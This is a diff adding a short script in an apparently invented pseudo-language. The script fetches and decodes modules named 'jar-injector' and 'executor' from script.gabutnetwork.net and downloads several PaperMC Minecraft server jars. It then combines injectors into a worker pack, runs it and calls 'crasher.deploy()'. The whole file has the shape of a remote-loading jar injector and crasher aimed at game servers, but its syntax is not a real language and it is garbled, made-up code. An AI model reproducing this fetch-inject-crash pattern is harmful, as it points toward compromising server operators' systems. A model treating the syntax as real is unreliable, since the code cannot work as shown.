@@ -1,0 +1,28 @@
+crisp decode /char/mlogic/pseudo-ai.gnf from get.https("script.gabutnetwork.net","proxy:5071")
+crisp decode /utilities/os/jar-injector.gnf from get.https("script.gabutnetwork.net","proxy:5071")
+crisp decode /utilities/os/executor.gnf from get.https("script.gabutnetwork.net","proxy:5071")
+crisp decode /utilities/worker/laravel/laravel-installer.gnf from get.https("script.gabutnetwork.net","proxy:5071")
+crisp decode /network/core-edit/websync.gnf from get.https("script.gabutnetwork.net","proxy:5071")
+crisp decode /operating-system/utils.gnf from get.https("script.gabutnetwork.net","proxy:5071")
+crisp close_conn
+
+jarfl extract from download.https("api.papermc.io/v2/projects/paper/versions/1.19.2/builds/132/downloads/paper-1.19.2-132.jar","proxy:none") as paper-1-19
+jarfl extract from download.https("api.papermc.io/v2/projects/paper/versions/1.17.1/builds/411/downloads/paper-1.17.1-411.jar","proxy:none") as paper-1-17
+jarfl extract from download.https("api.papermc.io/v2/projects/paper/versions/1.8.8/builds/445/downloads/paper-1.8.8-445.jar","proxy:none") as paper-1-8
+
+import writer from utils
+import tcp-s from networker
+import public.func from paper*
+import charcoal from executor
+import public.monster from paper-1-17
+import public.mob-general from paper-1-17
+import public.blocks from paper-1-8
+
+writer createfolder ."/plugins/"
+register.cloud_cache[1]
+if($conn) mid.deploy()
+
+combine electron.worker $conn importer ds_unscrap() gnf-injector jar-injector as $worker-pack
+
+charcoal run $worker-pack 
+crasher.deploy()
